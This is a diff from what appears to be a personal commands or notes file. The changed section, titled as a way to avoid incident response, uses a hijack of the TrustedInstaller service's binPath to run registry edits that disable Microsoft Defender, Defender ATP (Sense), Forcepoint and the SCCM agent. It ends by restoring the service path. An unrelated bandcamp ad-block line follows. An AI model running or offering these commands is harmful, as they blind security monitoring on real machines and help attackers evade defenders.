@@ -2975,11 +2975,15 @@ This is a difficult problem that took me forever to figure out but once I show y
 
 
 # Shhhh I can't IR ... Defender, ForcePoint, SMS Agent Host ...I just can't anymore ...
-Reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sense" /v Start /t reg_dword /d 4 /f
-Reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Fppsvc" /v Start /t reg_dword /d 4 /f
-Reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CcmExec" /v Start /t reg_dword /d 4 /f
-# needs "Trusted Installer" 
-Reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend" /v Start /t reg_dword /d 4 /f
+sc config TrustedInstaller binPath= "Reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sense" /v Start /t reg_dword /d 4 /f"  
+sc start "TrustedInstaller" 
+sc config TrustedInstaller binPath= "Reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Fppsvc" /v Start /t reg_dword /d 4 /f"  
+sc start "TrustedInstaller" 
+sc config TrustedInstaller binPath= "Reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CcmExec" /v Start /t reg_dword /d 4 /f"  
+sc start "TrustedInstaller" 
+sc config TrustedInstaller binPath= "Reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend" /v Start /t reg_dword /d 4 /f"  
+sc config TrustedInstaller binPath= "C:\Windows\servicing\TrustedInstaller.exe"
+
 
 # block bandcamp ads bandcamp feed albums only show
 ! 2022-09-07 https://bandcamp.com
